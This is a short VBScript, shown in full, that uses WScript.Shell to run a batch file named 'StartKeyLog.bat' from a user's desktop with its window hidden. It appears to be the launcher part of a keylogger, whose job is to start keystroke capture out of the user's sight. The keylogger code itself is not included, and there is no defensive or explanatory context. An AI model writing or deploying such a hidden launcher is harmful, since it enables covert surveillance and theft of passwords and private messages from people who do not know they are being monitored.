Dim WinScriptHost
Set WinScriptHost = CreateObject("WScript.Shell")
WinScriptHost.Run "C:\Users\James\Desktop\StartKeyLog.bat", 0
Set WinScriptHost = Nothing